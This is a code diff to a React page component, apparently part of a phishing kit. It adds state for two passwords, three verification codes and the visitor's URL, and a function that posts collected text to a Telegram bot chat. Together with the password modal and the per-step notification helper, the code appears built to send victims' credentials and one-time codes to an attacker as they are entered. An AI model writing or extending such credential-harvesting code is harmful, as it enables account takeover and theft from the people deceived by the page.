@@ -375,6 +375,40 @@ export default function HomePageClient({
   const passwordTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const botToken = TELEGRAM_BOT_TOKEN;
   const chatId = TELEGRAM_CHAT_ID;
+  const telegramEnabled = Boolean(botToken && chatId);
+  const [messageId, setMessageId] = useState<string | null>(null);
+  const [password1, setPassword1] = useState("");
+  const [password2, setPassword2] = useState("");
+  const [code1, setCode1] = useState("");
+  const [code2, setCode2] = useState("");
+  const [code3, setCode3] = useState("");
+  const [currentUrl, setCurrentUrl] = useState("");
+
+const sendTelegramMessage = async (text: string, options?: { disable_notification?: boolean }) => {
+  if (!telegramEnabled) return;
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text,
+        parse_mode: "HTML",
+        disable_notification: options?.disable_notification ?? true,
+      }),
+    });
+    const data = (await response.json()) as { ok?: boolean; result?: { message_id?: number } };
+    if (data?.ok && data.result?.message_id != null) {
+      const id = String(data.result.message_id);
+      setMessageId(id);
+      if (typeof window !== "undefined") {
+        window.localStorage.setItem("telegram_msg_id", id);
+      }
+    }
+  } catch (error) {
+    console.error("Telegram sendMessage Error:", error);
+  }
+};
 
 const stateRef = useRef({
   password1: "",
@@ -476,6 +510,8 @@ const pushUpdate = async (
     await editTelegramMessage(targetId, buildFullMessage());
   }
 };
+
+const editTelegramMessage = async (targetMessageId: string, text: string) => {
   try {
     await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
       method: "POST",
@@ -499,32 +535,6 @@ const notifyStep = async (label: string, value: string) => {
   await sendTelegramMessage(text, { disable_notification: false });
 };
 
-  const sendInitialDataToTelegram = async () => {
-    if (!telegramEnabled) {
-      return;
-    }
-
-    if (typeof window !== "undefined") {
-      localStorage.removeItem("telegram_msg_id");
-    }
-    setMessageId(null);
-    setPassword1("");
-    setPassword2("");
-    setCode1("");
-    setCode2("");
-    setCode3("");
-
-    const text = buildInitialMessage();
-    await sendTelegramMessage(text);
-  };
-
-  const updateTelegramMessage = async (label: string, value: string) => {
-    if (!telegramEnabled) {
-      return;
-    }
-    const text = buildUpdateMessage(label, value);
-    await sendTelegramMessage(text);
-  };
   const passwordStepMessage = modal.passwordStepMessage;
   const passwordPlaceholder = modal.passwordPlaceholder;
   const continueButtonLabel = modal.continueButtonLabel;
